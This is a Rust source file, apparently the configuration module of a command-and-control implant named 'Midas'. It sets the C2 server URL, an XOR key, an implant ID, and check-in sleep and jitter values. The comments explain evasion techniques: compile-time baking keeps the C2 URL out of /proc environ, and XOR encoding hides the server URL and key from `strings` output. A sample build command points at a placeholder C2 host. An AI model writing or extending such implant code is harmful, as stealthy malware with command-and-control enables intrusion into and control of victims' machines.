//! Build-time configuration.
//!
//! Tombili hardcodes these in `src/config.nim` and requires a source edit per
//! target. Midas reads them from the environment at *compile* time instead, so
//! the same checkout builds for any server:
//!
//! ```bash
//! MIDAS_SERVER=https://c2.example.com/ MIDAS_KEY=... cargo build --release
//! ```
//!
//! `option_env!` bakes the value into the binary. Reading these at runtime via
//! `env::var` would leave the C2 URL visible in /proc/<pid>/environ. The baked
//! values are XOR-encoded like every other string constant, so they do not show
//! up in `strings` output either - see `obf_env` below.

use crate::obf;
use crate::obf::MAX_LEN;

/// Identifies this implant to the server. Part of the agent's identity tuple
/// together with the reported IP, so it must differ from `tombili` or the two
/// implants collide on one host.
pub const IMPLANT_ID: &str = "midas";

/// Reported to the server as `registration.os`.
pub const OS: &str = std::env::consts::OS;

/// Compile-time encoding of an optional build-time value.
///
/// The pair is `(length, bytes)`; a length of zero means the variable was unset
/// or empty, and the caller falls back to its `obf!` default.
///
/// Encoding in a `const` matters here. Writing the `option_env!` value straight
/// into a `String` at runtime would compile to exactly that string in the
/// binary, and `MIDAS_KEY` is the one value in the whole implant that is worth
/// hiding. The encoded form is a fixed 256-byte array, so the plaintext is
/// never emitted.
const fn obf_env(value: Option<&'static str>) -> (usize, [u8; MAX_LEN]) {
    match value {
        Some(text) => obf::encode_static(text),
        None => (0, [0u8; MAX_LEN]),
    }
}

const SERVER: (usize, [u8; MAX_LEN]) = obf_env(option_env!("MIDAS_SERVER"));
const KEY: (usize, [u8; MAX_LEN]) = obf_env(option_env!("MIDAS_KEY"));

pub fn server_url() -> String {
    if SERVER.0 == 0 {
        obf!("http://127.0.0.1:3000/")
    } else {
        obf::decode(&SERVER.1, SERVER.0, obf::SEED)
    }
}

/// Must match a row in the server's `keys` table. See the note in
/// comm.rs::xor about the server only trying the first key.
pub fn xor_key() -> String {
    if KEY.0 == 0 {
        obf!("asdf")
    } else {
        obf::decode(&KEY.1, KEY.0, obf::SEED)
    }
}

pub fn reg_fail_limit() -> u32 {
    parse_u32("MIDAS_REG_FAIL_LIMIT", 10)
}

pub fn checkin_sleep() -> u64 {
    parse_u64("MIDAS_CHECKIN_SLEEP", 10)
}

pub fn checkin_jitter() -> u64 {
    parse_u64("MIDAS_CHECKIN_JITTER", 5)
}

fn parse_u64(name: &str, default: u64) -> u64 {
    std::env::var(name)
        .ok()
        .and_then(|value| value.parse().ok())
        .unwrap_or(default)
}

fn parse_u32(name: &str, default: u32) -> u32 {
    std::env::var(name)
        .ok()
        .and_then(|value| value.parse().ok())
        .unwrap_or(default)
}
